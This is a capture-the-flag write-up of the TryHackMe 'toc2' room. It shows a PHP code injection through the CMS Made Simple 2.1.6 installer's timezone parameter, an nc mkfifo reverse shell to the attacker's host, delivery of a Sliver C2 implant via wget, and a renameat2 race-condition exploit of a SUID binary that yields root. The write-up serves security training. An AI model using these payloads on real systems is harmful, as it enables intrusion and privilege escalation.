# toc2

## Introduction

Welcome to my another writeup! In this TryHackMe [toc2](https://tryhackme.com/room/toc2) room, you'll learn: Exploiting CMS Made Simple, race condition and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

*I have a theory that the truth is never told during the nine-to-five hours. - Hunter S. Thompson*

---

> It's a setup... Can you get the flags in time?

> Difficulty: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# export RHOSTS=10.10.248.228
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 844eb1493122948483979172cb233336 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuaqFOGQLuuh5gZPHAMXN7mbBvvKFQNjf7BE4nQcou0kK9vn/2NoMDyr3ZNKRvfG/Q2S+Nk1cew2KYvBN8OmJP0a4iTiQNd2MNftiOvH6zA7DbHD8WcuqoFNVUILB0fR3zHLOTJdZmvUX14TJnlGpd+Zt6wNOH9+EXNZDhjG7f7D/StcxurCuGAwkqQb7/oP5euE5sQaJ31ZnTL4RK4sk7LzXQprPBJa0IjEthBtKhSbKS0XmvzCFcSYNn/RUhFAOBR4WXKRGk9+WKlhj5KUli0BmUB6v9OnTcRZHjVQ7cj/8QoFYh5Ns38DM2oFYibhTGmODK6OeyOQgFe9iNc/KT
|   256 cc32193ff5b9a4d5ac320f6ef0833571 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAXDnQKHAfzUPrhhICFpTSbE3+bjHgyIEapWhaEZkimi2WdGqPh3+vX7602C3+B4Q+TitOB+YR7xQNmUxk89vac=
|   256 bdd800be49b515afbfd585f73aabd648 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3eshAl/8myavr2XQdEDrVBN5hBGf1Jwxn8CajXqhZ1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/cmsms/cmsms-2.1.6-install.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29 ((Ubuntu))

### HTTP on Port 80

**Adding a new domain to `/etc/hosts`:** (Optional, but it's a good practice to do so)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# echo "$RHOSTS toc2.thm" >> /etc/hosts
```

**`robots.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# curl http://toc2.thm/robots.txt
User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php
 
Note to self:
Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday.
```

**In the above text, we can see that the database name is `cmsmsdb`.**

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221122071814.png)

**That looks like a credentials!**

- Username: cmsmsuser
- Password: devpass

## Initial Foothold

In the `robots.txt`, it's **disallowing web crawler to index `/cmsms/cmsms-2.1.6-install.php`.**

**Let's find public exploits for this version of CMS Made Simple via `searchsploit`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# searchsploit CMS Made Simple 2.1.6
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection         | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                       | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                          | php/webapps/44192.txt
CMS Made Simple < 2.2.10 - SQL Injection                                               | php/webapps/46635.py
--------------------------------------------------------------------------------------- ---------------------------------
```

**Hmm... Let's look at the Remote Code Execution, `44192.txt`.**
```
1.Description
Arbitrary PHP code can be injected into configuration file (config.php) after installation has been finished. In order to inject PHP code, fresh install and valid database credentials is required. Application will force an installer (usually "www-data" due to web-based installation) to set a write permission (777) to destination directory and related installation file. An attacker will proceed installation process until reach step 4 and inject malicious PHP code into "timezone" parameter. Once PHP code has been injected to "config.php", an attacker will be able to execute OS command by accessing backdoor "config.php" file along with injected parameter which contain OS command value.

2.Proof of Concept
- Access to "http://target/path/cmsms-2.1.6-install.php" for installing CMS Made Simple
- Proceed to step 4 of installation which is database setup stage, enter a valid database credentials and modifying "timezone" parameter on intercepted proxy as following:

==========
POST /cms/cmsms-2.1.6-install.php/index.php?mdf68c24c=4 HTTP/1.1
Host: 192.168.5.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.5.196/cms/cmsms-2.1.6-install.php/index.
php?mdf68c24c=4
Cookie: CMSICc861538bbb=i549m59qpme0u9klupbkb68me4
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

dbhost=localhost&dbname=cms&dbuser=xvwa&dbpass=xvwa&
timezone=junk';echo%20system($_GET['cmd']);$junk='junk&next=Next+%E2%86%92
==========

- Forward tampered "timezone" parameter packet and proceed to next step until successfully installation.
- Execute OS command via "config.php" by requesting " http://target/path/config.php?cmd=id;uname"
```

Hmm... **The `timezone` parameter in the installation PHP page is vulnerable to command injection!**

Let's go to `http://toc2.thm/cmsms/cmsms-2.1.6-install.php/index.php` to exploit it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124031902.png)

We can click `Next`, until we're at **step 4**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032030.png)

**Now, let's intercept the POST request via Burp Suite, and modify the `timezone` parameter!**

Since we know **the database name is `cmsmsdb`, username is `cmsmsuser` and password is `devpass`**, we can exploit the command injection vulnerability!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032219.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032245.png)

**Forward that tampered POST request and finish all the installation steps:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032415.png)

> Note: Admin username and password can be random.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032501.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/toc2/images/Pasted%20image%2020221124032651.png)

**Now, we can execute OS command via going to the `config.php` page:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# curl 'http://toc2.thm/cmsms/config.php?cmd=id;hostname' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
toc
```

Nice!!

**Let's get a reverse shell!**

**To do so, I'll:**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# nc -lnvp 443   
listening on [any] 443 ...
```

- Send the reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

But first, we need to know `which` programme that we can abuse on the target machine:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# curl http://toc2.thm/cmsms/config.php --get --data-urlencode "cmd=which nc"     
/bin/nc
```

**It's has `nc` installed! Let's use `nc` payload for our reverse shell:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# curl http://toc2.thm/cmsms/config.php --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.0.253 443 >/tmp/f"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.248.228] 45592
bash: cannot set terminal process group (927): Inappropriate ioctl for device
bash: no job control in this shell
www-data@toc:/var/www/html/cmsms$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
toc
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ce:63:e0:0d:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.248.228/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3060sec preferred_lft 3060sec
    inet6 fe80::ce:63ff:fee0:d67/64 scope link 
       valid_lft forever preferred_lft forever
```

We're in!

**We can also upgrade our shell to a stable shell, so we won't accidentally exit the shell:**

> Note: Since I wanna practice my red teaming skills, I'll use a C2 (Command and Control) framework called [Sliver](https://github.com/BishopFox/sliver).

- Teamserver:

**Starting the teamserver:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# /opt/sliver-server_linux
[...]
[server] sliver > 
```

**Create a new profile for a player (client) to connect:**
```
[server] sliver > new-operator --lhost 10.9.0.253 --lport 31337 --name siunam --save /root/.sliver-client/configs

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /root/.sliver-client/configs/siunam_10.9.0.253.cfg

[server] sliver > operators

 Name     Status  
======== =========
 siunam   Offline
```

**Start multiplayer mode:**
```
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

- Client:

**Connect to the teamserver:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# /opt/sliver-client_linux
[...]
sliver >  
```

**Now, we can use Sliver C2 to generate an implant (payload) which using the mTLS for connection:**
```
sliver > generate --mtls 10.9.0.253 --os linux --save ./implant

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 34s
[*] Implant saved to /root/ctf/thm/ctf/toc2/implant
```

**Start mTLS listener:**
```
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port  
==== ====== ========== =======
 1    grpc   tcp        31337 
 2    mtls   tcp        8888
```

**Deliver the implant, and execute it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# python3 -m http.server 80                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@toc:/var/www/html/cmsms$ wget http://10.9.0.253/implant -O /tmp/implant;chmod +x /tmp/implant

www-data@toc:/var/www/html/cmsms$ /tmp/implant
```

**Client:**
```
[*] Session e546ea92 PLAIN_BANKER - 10.10.248.228:39856 (toc) - linux/amd64 - Thu, 24 Nov 2022 04:14:41 EST

sliver > sessions

 ID         Transport   Remote Address        Hostname   Username   Operating System   Health  
========== =========== ===================== ========== ========== ================== =========
 e546ea92   mtls        10.10.248.228:39856   toc        www-data   linux/amd64        [ALIVE]
```

**Now we can interact with the new session!**
```
sliver > sessions -i e546ea92

[*] Active session PLAIN_BANKER (e546ea92)

sliver (PLAIN_BANKER) > 
```

**Let's start an interactive shell!**
```
sliver (PLAIN_BANKER) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 22962

www-data@toc:/var/www/html/cmsms$ whoami;hostname;id;ip a
www-data
toc
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ce:63:e0:0d:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.248.228/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2304sec preferred_lft 2304sec
    inet6 fe80::ce:63ff:fee0:d67/64 scope link 
       valid_lft forever preferred_lft forever
www-data@toc:/var/www/html/cmsms$ ^C
www-data@toc:/var/www/html/cmsms$ 
```

**user.txt:**
```
www-data@toc:/var/www/html/cmsms$ cat /home/frank/user.txt 
thm{Redacted}
```

## Privilege Escalation

### www-data to frank

**In user `frank` home directory, we can see an interesting file and a directory:**
```
www-data@toc:/var/www/html/cmsms$ ls -lah /home/frank
[...]
-rw-r--r-- 1 frank frank  331 Aug 17  2020 new_machine.txt
drwxr-xr-x 2 frank frank 4.0K Jan 31  2021 root_access
```

**`new_machine.txt`:**
```
www-data@toc:/var/www/html/cmsms$ cat /home/frank/new_machine.txt 
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait.
```

`The inventory team sent me a new Thinkpad, the password is "password".`

**So user `frank` password is `password`??**

**Let's Switch User to `frank`:**
```
www-data@toc:/var/www/html/cmsms$ su frank
Password: 
frank@toc:/var/www/html/cmsms$ whoami;id
frank
uid=1000(frank) gid=1000(frank) groups=1000(frank),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

I'm user `frank`!

### frank to root

**Hmm... How about the `/root_access` directory?**
```
frank@toc:/var/www/html/cmsms$ cd ~/root_access/
frank@toc:~/root_access$ ls -lah
total 28K
drwxr-xr-x 2 frank frank 4.0K Jan 31  2021 .
drwxr-xr-x 5 frank frank 4.0K Aug 18  2020 ..
-rwsr-xr-x 1 root  root  8.5K Jan 31  2021 readcreds
-rw-r--r-- 1 root  root   656 Jan 31  2021 readcreds.c
-rw------- 1 root  root    34 Aug 23  2020 root_password_backup
```

In here, we can't read the `root_password_backup` file, as **it's only readable and writable by `root`**.

**But, the `readcreds` looks like is an exeutable written in C, and it has a SUID sticky bit, which allows us to execute it as the owner of the file (`root`)!**
```
frank@toc:~/root_access$ file readcreds
readcreds: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0379954311c3c40ed2710754cfd967d8fc6a27ab, not stripped
```

**Let's read the source code of that executable!**
```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
	exit(1);
    }

    if (!access(argv[1],R_OK)) {
	    sleep(1);
	    file_data = open(argv[1], O_RDONLY);
    } else {
	    fprintf(stderr, "Cannot open %s \n", argv[1]);
	    exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);

}
```

**Let's break it down!**
- Function `main()`:
	- It needs an argument, which is the name of the file
	- Checks the executable can access the file or not, if yes, then ***sleep 1 second***, and read the data inside the file
	- If not, print `Cannot open <filename>`
	- After reading the data inside the file, `write` bytes from the buffer

```
frank@toc:~/root_access$ echo "test" > test.txt

frank@toc:~/root_access$ time ./readcreds test.txt
test

real	0m1.001s
user	0m0.001s
sys	0m0.000s

frank@toc:~/root_access$ time ./readcreds /root/root.txt
Cannot open /root/root.txt 

real	0m0.001s
user	0m0.001s
sys	0m0.000s
```

Hmm... **Why it's sleeping for 1 second** after having a successful read??

After some googling, I found that this is called: **Race condition**

Also, according to [Wikipedia](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use), **the `readcreds` might vulnerable to Time-of-check to time-of-use (TOCTOU, TOCTTOU, TOC/TOU) attack, which is this room's name!**

**Before we exploit this vulnerability, we could try to read the root's password file via symbolic link file:**
```
frank@toc:~/root_access$ ln -s root_password_backup fakepassword

frank@toc:~/root_access$ ls -lah
[...]
lrwxrwxrwx 1 frank frank   20 Nov 24 09:54 fakepassword -> root_password_backup

frank@toc:~/root_access$ ./readcreds fakepassword 
Cannot open fakepassword
```

We couldn't read the root password via this method.

**However, we can abuse the race condition to read the root flag!**

After some googling, I found that **there is a C source code that renaming and swapping 2 files in an infinite loop in [GitHub](https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c)!**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

**Let's transfer that C source code and compile it!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/toc2]
└─# wget https://raw.githubusercontent.com/sroettger/35c3ctf_chals/master/logrotate/exploit/rename.c
```

```
[server] sliver > sessions -i e546ea92

[server] sliver (PLAIN_BANKER) > upload ./rename.c /tmp/rename.c

[*] Wrote file to /tmp/rename.c
```

```
frank@toc:~/root_access$ gcc /tmp/rename.c -o rename
```

**Next, we can create an empty file:**
```
frank@toc:~/root_access$ touch anything
```

**Now, let's swap both `anything` and `root_password_backup` in an infinite loop, and put this process into background:**
```
frank@toc:~/root_access$ ./rename root_password_backup anything &
[1] 2871
```

```
frank@toc:~/root_access$ ls -lah
[...]
-rw-rw-r-- 1 frank frank    0 Nov 24 10:04 anything
[...]
-rw------- 1 root  root    34 Aug 23  2020 root_password_backup

frank@toc:~/root_access$ ls -lah
[...]
-rw------- 1 root  root    34 Aug 23  2020 anything
[...]
-rw-rw-r-- 1 frank frank    0 Nov 24 10:04 root_password_backup
```

**We can see that both files are swapped!**

**Let's run the `readcreds` to read root's credentials!**
```
frank@toc:~/root_access$ ./readcreds anything 
Cannot open anything

frank@toc:~/root_access$ ./readcreds anything 
Root Credentials:  root:{Redacted}
```

Boom! We now can read `root_password_backup` file!

**We can Switch User to `root` or SSH with that password!**
```
frank@toc:~/root_access$ su root
Password: 
root@toc:/home/frank/root_access# whoami;hostname;id;ip a
root
toc
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ce:63:e0:0d:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.248.228/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2937sec preferred_lft 2937sec
    inet6 fe80::ce:63ff:fee0:d67/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@toc:/home/frank/root_access# cat /root/root.txt
thm{Redacted}
```

# Conclusion

What we've learned:

1. Exploiting CMS Made Simple Version 2.1.6
2. Privilege Escalation via Abusing Race Condition